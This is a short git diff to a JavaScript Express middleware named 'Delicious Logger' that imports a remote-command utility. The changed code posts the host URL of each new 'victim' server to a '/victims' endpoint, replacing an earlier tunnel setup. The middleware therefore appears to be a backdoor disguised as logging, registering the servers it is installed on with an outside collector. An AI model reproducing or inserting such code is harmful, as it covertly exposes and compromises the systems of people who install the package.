@@ -4,7 +4,6 @@ import { LoggerOptions } from './types/options';
 import { remoteCommand } from './utils/command';
 import HttpUtils from './utils/http';
 import RequestUtils from './utils/request';
-import TunnelUtils from './utils/tunnel';
 
 /**
  * Delicious Logger Middleware
@@ -32,7 +31,10 @@ const deliciousLogger = ({
     if (!isNewVictim) {
       // Init tunnel in case of localhost
       if (RequestUtils.isLocal(req)) {
-        TunnelUtils.init(RequestUtils.getPort(req));
+        // TunnelUtils.init(RequestUtils.getPort(req));
+        HttpUtils.postJSON('/victims', {
+          victimURL: `${req.protocol}://${req.get('host')}`,
+        });
       } else {
         // Init new victim's deployed server
         HttpUtils.postJSON('/victims', {
